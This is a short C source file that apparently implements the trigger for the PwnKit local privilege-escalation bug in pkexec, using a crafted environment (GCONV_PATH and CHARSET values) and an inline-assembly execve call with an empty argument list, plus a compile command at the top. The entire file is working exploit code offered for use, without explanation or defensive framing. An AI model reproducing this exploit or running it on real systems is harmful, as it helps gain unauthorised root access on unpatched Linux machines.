// gcc -static -nostdlib cvex.c -o exp
#include <sys/syscall.h>

void _start() {
	// remove compile
	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", 0 };
	//execve("/usr/bin/pkexec", env+4, env);
	// x86_64 only
	asm volatile (
		"syscall"
		:
		: "a" (SYS_execve), "D" ("/usr/bin/pkexec"), "S" (env+4), "d" (env)
	);
}
